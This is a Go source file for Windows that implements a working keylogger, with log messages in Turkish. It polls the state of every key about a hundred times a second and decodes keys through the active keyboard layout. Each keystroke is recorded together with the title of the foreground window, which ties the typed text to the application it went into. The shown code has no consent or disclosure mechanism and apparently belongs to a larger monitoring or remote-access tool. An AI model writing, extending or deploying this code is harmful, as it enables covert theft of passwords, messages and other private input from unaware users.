//go:build windows

package main

import (
	"log"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	user32                   = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW       = user32.NewProc("GetWindowTextW")
	procGetKeyboardState     = user32.NewProc("GetKeyboardState")
	procToUnicode            = user32.NewProc("ToUnicode")
	procMapVirtualKeyW       = user32.NewProc("MapVirtualKeyW")
	procGetKeyboardLayout    = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
)

func platformKeylogAvailable() bool {
	return true
}

func platformKeylogError() string {
	return "Windows keylogger başlatılamadı"
}

func getActiveWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return syscall.UTF16ToString(buf)
}

// vkToChar converts a virtual key code to the actual typed character
// using ToUnicode, which respects the active keyboard layout (Turkish Q, F, etc.)
func vkToChar(vk int, kbState []byte) string {
	// Get scan code
	scanCode, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)

	// Get foreground window's keyboard layout
	hwnd, _, _ := procGetForegroundWindow.Call()
	var tid uintptr
	if hwnd != 0 {
		tid, _, _ = procGetWindowThreadProcessId.Call(hwnd, 0)
	}
	hkl, _, _ := procGetKeyboardLayout.Call(tid)

	_ = hkl // ToUnicode uses thread's active layout automatically

	// ToUnicode output buffer
	outBuf := make([]uint16, 8)
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		scanCode,
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(len(outBuf)),
		0,
	)

	n := int(int32(ret)) // signed
	if n > 0 {
		// Successfully translated — return the actual character
		runes := utf16.Decode(outBuf[:n])
		return string(runes)
	}
	if n < 0 {
		// Dead key (e.g. ^ on Turkish F) — consume it, return empty
		// Call ToUnicode again to clear the dead key state
		procToUnicode.Call(
			uintptr(vk), scanCode,
			uintptr(unsafe.Pointer(&kbState[0])),
			uintptr(unsafe.Pointer(&outBuf[0])),
			uintptr(len(outBuf)), 0,
		)
		return ""
	}

	// n == 0: no translation (control key etc.)
	return ""
}

func platformKeylogCapture(stopCh chan struct{}) {
	log.Println("[KEYLOG-WIN] ToUnicode + GetAsyncKeyState polling başlatıldı")

	prevState := make(map[int]bool)
	kbState := make([]byte, 256)

	for {
		select {
		case <-stopCh:
			return
		default:
		}

		window := getActiveWindowTitle()

		// Refresh full keyboard state for ToUnicode (shift, alt, ctrl, caps lock etc.)
		procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))

		for vk := 1; vk < 255; vk++ {
			// Skip modifier keys — they don't produce characters
			switch vk {
			case 16, 17, 18, // shift, ctrl, alt
				160, 161, 162, 163, 164, 165, // L/R variants
				91, 92: // win keys
				continue
			}

			ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
			pressed := (ret & 0x8000) != 0

			if pressed && !prevState[vk] {
				// First check if it's a special key
				special := vkToSpecial(vk)
				if special != "" {
					addKeyEvent(special, window)
				} else {
					// Use ToUnicode for actual character (handles Turkish, etc.)
					ch := vkToChar(vk, kbState)
					if ch != "" {
						addKeyEvent(ch, window)
					}
				}
			}

			prevState[vk] = pressed
		}

		time.Sleep(10 * time.Millisecond) // ~100 Hz polling
	}
}

// vkToSpecial returns a bracketed name for non-character keys, empty string for character keys
func vkToSpecial(vk int) string {
	switch vk {
	case 8:
		return "[BACKSPACE]"
	case 9:
		return "[TAB]"
	case 13:
		return "[ENTER]"
	case 19:
		return "[PAUSE]"
	case 20:
		return "[CAPSLOCK]"
	case 27:
		return "[ESC]"
	case 32:
		return " "
	case 33:
		return "[PGUP]"
	case 34:
		return "[PGDN]"
	case 35:
		return "[END]"
	case 36:
		return "[HOME]"
	case 37:
		return "[LEFT]"
	case 38:
		return "[UP]"
	case 39:
		return "[RIGHT]"
	case 40:
		return "[DOWN]"
	case 44:
		return "[PRTSC]"
	case 45:
		return "[INS]"
	case 46:
		return "[DEL]"
	case 112:
		return "[F1]"
	case 113:
		return "[F2]"
	case 114:
		return "[F3]"
	case 115:
		return "[F4]"
	case 116:
		return "[F5]"
	case 117:
		return "[F6]"
	case 118:
		return "[F7]"
	case 119:
		return "[F8]"
	case 120:
		return "[F9]"
	case 121:
		return "[F10]"
	case 122:
		return "[F11]"
	case 123:
		return "[F12]"
	case 144:
		return "[NUMLOCK]"
	case 145:
		return "[SCROLLLOCK]"
	default:
		return ""
	}
}
